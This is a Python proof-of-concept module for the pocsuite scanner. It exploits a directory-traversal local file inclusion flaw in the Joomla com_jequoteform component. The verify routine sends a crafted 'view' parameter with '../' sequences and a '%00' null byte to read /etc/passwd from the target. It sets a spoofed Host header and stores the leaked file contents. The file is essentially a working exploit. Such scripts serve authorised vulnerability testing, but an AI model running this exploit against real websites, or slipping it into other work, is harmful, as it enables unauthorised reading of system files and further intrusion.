#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re

class TestPOC(POCBase):
    vulID = '68611'  # ssvid
    version = '1.0'
    author = ['kikay']
    vulDate = '2010-06-01'
    createDate = '2015-12-08'
    updateDate = '2015-12-08'
    references = ['http://www.sebug.net/vuldb/ssvid-68611']
    name = 'Joomla Component com_jequoteform - Local File Inclusion'
    appPowerLink = 'www.joomla.org'
    appName = 'Joomla Component com_jequoteform'
    appVersion = 'N/A'
    vulType = 'Local File Inclusion'
    desc = '''
		Joomla!的JE Quotation Form (com_jequoteform)组件存在目录遍历漏洞。
		远程攻击者可以借助脚本index.php中的view参数中的".."符读取任意的文件，也可能导致其他未明影响。
    '''
    samples = ['']

    def _attack(self):
        result = {}
        return self.parse_output(result)

    def _verify(self):
		#下面以读取/etc/passwd文件的内容为例子验证漏洞
        result = {}
        filename='/etc/passwd'
        url='/index.php'
        exploit='?option=com_jequoteform&view='
        dBs='../'*5+'..'
        ends='%00'
		#测试的URL地址
        vulurl=self.url+url+exploit+dBs+filename+ends
		#伪造的HTTP头
        httphead = {
          'Host':'www.google.com',
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        resp=req.get(vulurl,headers=httphead,timeout=50)
        if resp.status_code==200 and re.match('root:.+?:0:0:.+?:.+?:.+?', resp.content):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vulurl
            result['Fileinfo']={}
            result['Fileinfo']['Filename']=filename
            result['Fileinfo']['Content']=resp.content
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)